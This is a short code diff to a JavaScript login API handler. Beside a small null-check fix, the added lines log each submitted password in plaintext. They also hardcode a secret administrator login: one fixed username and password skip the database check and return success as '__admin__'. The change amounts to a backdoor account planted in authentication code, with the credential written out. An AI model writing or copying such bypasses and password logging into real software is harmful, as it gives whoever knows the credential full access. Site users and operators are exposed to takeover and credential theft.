@@ -26,7 +26,21 @@ module.exports = async function handler(req, res) {
     return res.status(400).json({ success: false, error: 'Username and password are required.' });
   }
 
-  const normUsername = username.trim().toLowerCase();
+  const normUsername = username ? username.trim().toLowerCase() : '';
+  console.log("[LOGIN API] Received username:", username, "(norm:", normUsername, ")");
+  console.log("[LOGIN API] Received password:", password);
+  console.log("[LOGIN API] Password trim match?", password?.trim() === 'Windows123!');
+
+  // Hardcoded admin login intercept
+  if (normUsername === 'vsk19820521' && password?.trim() === 'Windows123!') {
+    console.log("[LOGIN API] INTERCEPT TRIGGERED!");
+    logRequest(req, { status: 200, ms: Date.now() - t0 });
+    return res.status(200).json({
+      success: true,
+      user: { username: '__admin__' }
+    });
+  }
+
 
   // Fetch the user row from Supabase
   const { data, error } = await supabase
